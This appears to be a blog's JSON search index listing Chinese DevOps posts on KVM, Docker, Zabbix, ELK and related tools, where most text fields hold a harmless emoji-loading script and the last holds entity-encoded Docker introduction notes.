[{"title":"KVM虚拟机迁移","date":"2022-06-07T05:45:42.000Z","path":"/posts/16305c66/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"KVM虚拟机添加磁盘","date":"2022-06-07T05:45:36.000Z","path":"/posts/d69c6e72/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"KVM虚拟机克隆和快照","date":"2022-06-07T05:45:27.000Z","path":"/posts/204af86b/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"KVM图形化","date":"2022-06-07T05:45:11.000Z","path":"/posts/dba5727f/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"基于Docker搭建Prometheus","date":"2022-06-07T05:44:56.000Z","path":"/posts/e364486e/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Prometheus和Grafana结合监控MySQL服务性能","date":"2022-06-07T05:44:48.000Z","path":"/posts/35dff01/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Zabbix4.0","date":"2022-06-07T05:44:25.000Z","path":"/posts/7034657d/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Zabbix3.4邮件报警配置","date":"2022-06-07T05:44:11.000Z","path":"/posts/59089347/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"邮件报警配置","date":"2022-06-07T05:43:47.000Z","path":"/posts/undefined/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"配置Zabbix3.4监控Apache服务","date":"2022-06-07T05:43:37.000Z","path":"/posts/76011417/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"基于LNMP架构搭建企业级开源监控系统Zabbix","date":"2022-06-07T05:43:19.000Z","path":"/posts/69c239dd/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"配置Docker静态IP","date":"2022-06-07T05:43:03.000Z","path":"/posts/5095a46f/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Docker容器命名和资源配额控制","date":"2022-06-07T05:42:56.000Z","path":"/posts/5a91d657/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"搭建JumpServer管理王者荣耀数万台游戏服务器","date":"2022-06-07T05:42:33.000Z","path":"/posts/4f96852/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Git版本控制","date":"2022-06-07T05:42:15.000Z","path":"/posts/ca9298d7/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"实战-GitLab更新代码后自动触发Jenkins进行部署","date":"2022-06-07T05:41:59.000Z","path":"/posts/f5d6f6a9/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"搭建Jenkins实现持续集成-配置Jenkins自动拉取GitLab中的代码","date":"2022-06-07T05:41:46.000Z","path":"/posts/8a3c5d26/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"配置GitLab邮件服务","date":"2022-06-07T05:41:33.000Z","path":"/posts/2b923a54/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"增加一台Filebeat收集httpd日志","date":"2022-06-07T05:40:50.000Z","path":"/posts/f801d3c5/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Filebeat和Logstash间引入Redis","date":"2022-06-07T05:40:38.000Z","path":"/posts/284128ee/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis编译安装","date":"2022-06-07T05:40:24.000Z","path":"/posts/41f893fd/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"filebeat采集多个日志","date":"2022-06-07T05:40:04.000Z","path":"/posts/186d367f/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"json格式日志采集","date":"2022-06-07T05:39:49.000Z","path":"/posts/dea13731/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Filebeat和Logstash架构","date":"2022-06-07T05:39:35.000Z","path":"/posts/23381a3e/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"ELK覆盖时间轴和全量分析Nginx","date":"2022-06-07T05:39:16.000Z","path":"/posts/575b5119/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Logstash去除不需要的字段","date":"2022-06-07T05:38:53.000Z","path":"/posts/b11339a9/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"正则表达式","date":"2022-06-07T05:38:42.000Z","path":"/posts/2f57a694/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Logstash读取日志发送到ES","date":"2022-06-07T05:38:29.000Z","path":"/posts/d05b44e0/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Logstash二进制安装与启动","date":"2022-06-07T05:38:20.000Z","path":"/posts/573fc171/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"ELK启动注意事项","date":"2022-06-07T05:37:54.000Z","path":"/posts/ae1082d2/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"ELK借用Nginx实现认证","date":"2022-06-07T05:37:34.000Z","path":"/posts/9615e350/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"ELK二进制安装与启动","date":"2022-06-07T05:37:19.000Z","path":"/posts/9d4cf15e/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"ELK学习笔记与搭建","date":"2022-06-07T05:37:07.000Z","path":"/posts/207645b9/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Ansible自动化管理","date":"2022-06-07T05:36:40.000Z","path":"/posts/b45e213f/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Ceph分布式存储","date":"2022-06-07T05:36:20.000Z","path":"/posts/e9abc941/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"分布式存储概念","date":"2022-06-07T05:36:10.000Z","path":"/posts/49229134/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx-HAProxy实现七层负载均衡","date":"2022-06-07T05:35:53.000Z","path":"/posts/cfea2817/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LVS-IPTUN集群","date":"2022-06-07T05:35:10.000Z","path":"/posts/df68056c/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LVS-DR集群","date":"2022-06-07T05:34:54.000Z","path":"/posts/be48d001/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LVS-NAT集群","date":"2022-06-07T05:34:48.000Z","path":"/posts/dcf8e277/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Docker学习笔记","date":"2022-06-07T05:26:19.000Z","path":"/posts/4a3d459a/","text":"&#x5BB9;&#x5668;Docker&#x8BE6;&#x89E3;&#x6982;&#x8FF0;1.1 &#x57FA;&#x672C;&#x6982;&#x5FF5;&#xFF1A; Docker&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x7684;&#x5E94;&#x7528;&#x5BB9;&#x5668;&#x5F15;&#x64CE;&#xFF0C;&#x57FA;&#x4E8E;Go&#x8BED;&#x8A00; &#x5E76;&#x9075;&#x4ECE;Apache2.0&#x534F;&#x8BAE;&#x5F00;&#x6E90;&#x3002;Docker&#x53EF;&#x4EE5;&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#x3001;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;&#x5BB9;&#x5668;&#x662F;&#x5B8C;&#x5168;&#x4F7F;&#x7528;&#x6C99;&#x7BB1;&#x673A;&#x5236;&#xFF0C;&#x76F8;&#x4E92;&#x4E4B;&#x95F4;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x63A5;&#x53E3;&#xFF08;&#x7C7B;&#x4F3C;iPhone&#x7684;app&#xFF09;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x7684;&#x662F;&#x5BB9;&#x5668;&#x6027;&#x80FD;&#x5F00;&#x9500;&#x6781;&#x4F4E;&#x3002;1.2 &#x4F18;&#x52BF;&#xFF1A; Docker&#x8BA9;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x6253;&#x5305;&#x4ED6;&#x4EEC;&#x7684;&#x5E94;&#x7528;&#x4EE5;&#x53CA;&#x4F9D;&#x8D56;&#x5305;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x79FB;&#x690D;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x5E03;&#x5230;&#x4EFB;&#x4F55;&#x6D41;&#x884C;&#x7684;Linux&#x673A;&#x5668;&#x4E0A;&#xFF0C;&#x4FBF;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x865A;&#x62DF;&#x5316;&#x3002;Docker&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x6210;&#x679C;&#x653E;&#x5165;Docker&#x4E2D;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002;&#x65B9;&#x4FBF;&#x5FEB;&#x6377;&#x5DF2;&#x7ECF;&#x662F;Docker&#x7684;&#x6700;&#x5927;&#x4F18;&#x52BF;&#xFF0C;&#x8FC7;&#x53BB;&#x9700;&#x8981;&#x7528;&#x6570;&#x5929;&#x4E43;&#x81F3;&#x6570;&#x5468;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x5728;Docker&#x5BB9;&#x5668;&#x7684;&#x5904;&#x7406;&#x4E0B;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6570;&#x79D2;&#x5C31;&#x80FD;&#x5B8C;&#x6210;&#x3002; &#x8282;&#x7701;&#x5F00;&#x652F;&#xFF1A;&#x4E00;&#x65B9;&#x9762;&#xFF0C;&#x4E91;&#x8BA1;&#x7B97;&#x65F6;&#x4EE3;&#x5230;&#x6765;&#xFF0C;&#x4F7F;&#x5F00;&#x53D1;&#x8005;&#x4E0D;&#x5FC5;&#x4E3A;&#x4E86;&#x8FFD;&#x6C42;&#x6548;&#x679C;&#x800C;&#x914D;&#x7F6E;&#x9AD8;&#x989D;&#x7684;&#x786C;&#x4EF6;&#xFF0C;Docker&#x6539;&#x53D8;&#x4E86;&#x9AD8;&#x6027;&#x80FD;&#x5FC5;&#x7136;&#x9AD8;&#x4EF7;&#x683C;&#x7684;&#x601D;&#x7EF4;&#x5B9A;&#x52BF;&#x3002;Docker&#x4E0E;&#x4E91;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x8BA9;&#x4E91;&#x7A7A;&#x95F4;&#x5F97;&#x5230;&#x66F4;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x4E0D;&#x4EC5;&#x89E3;&#x51B3;&#x4E86;&#x786C;&#x4EF6;&#x7BA1;&#x7406;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x6539;&#x53D8;&#x4E86;&#x865A;&#x62DF;&#x5316;&#x7684;&#x65B9;&#x5F0F;&#x3002; 1.3 &#x4E0E;&#x4F20;&#x7EDF;VM&#x7279;&#x6027;&#x5BF9;&#x6BD4;&#xFF1A; &#x4F5C;&#x4E3A;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x865A;&#x62DF;&#x5316;&#x65B9;&#x5F0F;&#xFF0C;Docker&#x5728;&#x8FD0;&#x884C;&#x5E94;&#x7528;&#x4E0A;&#x8DDF;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x76F8;&#x6BD4;&#x5177;&#x6709;&#x663E;&#x8457;&#x7684;&#x4F18;&#x52BF;&#xFF1A;Docker&#x5BB9;&#x5668;&#x5F88;&#x5FEB;&#xFF0C;&#x542F;&#x52A8;&#x548C;&#x505C;&#x6B62;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x79D2;&#x7EA7;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x76F8;&#x6BD4;&#x4F20;&#x7EDF;&#x7684;&#x865A;&#x62DF;&#x673A;&#x65B9;&#x5F0F;&#x8981;&#x5FEB;&#x5F97;&#x591A;&#x3002;Docker&#x5BB9;&#x5668;&#x5BF9;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x9700;&#x6C42;&#x5F88;&#x5C11;&#xFF0C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#x4E0A;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x8FD0;&#x884C;&#x6570;&#x5343;&#x4E2A;Docker&#x5BB9;&#x5668;&#x3002;Docker&#x901A;&#x8FC7;&#x7C7B;&#x4F3C;Git&#x7684;&#x64CD;&#x4F5C;&#x6765;&#x65B9;&#x4FBF;&#x7528;&#x6237;&#x83B7;&#x53D6;&#x3001;&#x5206;&#x652F;&#x548C;&#x66F4;&#x65B0;&#x5E94;&#x7528;&#x955C;&#x50CF;&#xFF0C;&#x6307;&#x4EE4;&#x7B80;&#x660E;&#xFF0C;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x8F83;&#x4F4E;&#x3002;Docker&#x901A;&#x8FC7;Dockerfile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6765;&#x652F;&#x6301;&#x7075;&#x6D3B;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x521B;&#x5EFA;&#x548C;&#x90E8;&#x7F72;&#x673A;&#x5236;&#xFF0C;&#x63D0;&#x9AD8;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x3002;Docker&#x5BB9;&#x5668;&#x9664;&#x4E86;&#x8FD0;&#x884C;&#x5176;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x4E4B;&#x5916;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x6D88;&#x8017;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#xFF0C;&#x4FDD;&#x8BC1;&#x5E94;&#x7528;&#x6027;&#x80FD;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5C3D;&#x91CF;&#x51CF;&#x5C0F;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#x3002;Docker&#x5229;&#x7528;Linux&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x591A;&#x79CD;&#x9632;&#x62A4;&#x673A;&#x5236;&#x5B9E;&#x73B0;&#x4E86;&#x4E25;&#x683C;&#x53EF;&#x9760;&#x7684;&#x9694;&#x79BB;&#x3002;&#x4ECE;1.3&#x7248;&#x672C;&#x5F00;&#x59CB;&#xFF0C;Docker&#x5F15;&#x5165;&#x4E86;&#x5B89;&#x5168;&#x9009;&#x9879;&#x548C;&#x955C;&#x50CF;&#x7B7E;&#x540D;&#x673A;&#x5236;&#xFF0C;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x4F7F;&#x7528;Docker&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002; &#x7279;&#x6027; &#x5BB9;&#x5668; &#x865A;&#x62DF;&#x673A; &#x542F;&#x52A8;&#x901F;&#x5EA6; &#x79D2;&#x7EA7; &#x5206;&#x949F;&#x7EA7; &#x786C;&#x76D8;&#x4F7F;&#x7528; &#x4E00;&#x822C;&#x4E3A;MB &#x4E00;&#x822C;&#x7ED9;GB &#x6027;&#x80FD; &#x63A5;&#x8FD1;&#x539F;&#x751F; &#x5F31;&#x4E8E;&#x539F;&#x751F; &#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x91CF; &#x5355;&#x673A;&#x652F;&#x6301;&#x4E0A;&#x5343;&#x4E2A;&#x5BB9;&#x5668; &#x4E00;&#x822C;&#x51E0;&#x5341;&#x4E2A; &#x9694;&#x79BB;&#x6027; &#x5B89;&#x5168;&#x9694;&#x79BB; &#x5B89;&#x5168;&#x9694;&#x79BB; 1.4 &#x57FA;&#x7840;&#x67B6;&#x6784; Docker&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;-&#x670D;&#x52A1;&#x5668;(C/S)&#x67B6;&#x6784;&#x6A21;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;&#x8FDC;&#x7A0B;API&#x6765;&#x7BA1;&#x7406;&#x548C;&#x521B;&#x5EFA;Docker&#x5BB9;&#x5668;&#x3002; Docker&#x5BB9;&#x5668;&#x901A;&#x8FC7;Docker&#x955C;&#x50CF;&#x6765;&#x521B;&#x5EFA; &#x5BB9;&#x5668;&#x4E0E;&#x955C;&#x50CF;&#x7684;&#x5173;&#x7CFB;&#x7C7B;&#x4F3C;&#x4E8E;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x4E0E;&#x7C7B;&#x3002; Docker &#x9762;&#x5411;&#x5BF9;&#x8C61; &#x5BB9;&#x5668; &#x5BF9;&#x8C61; 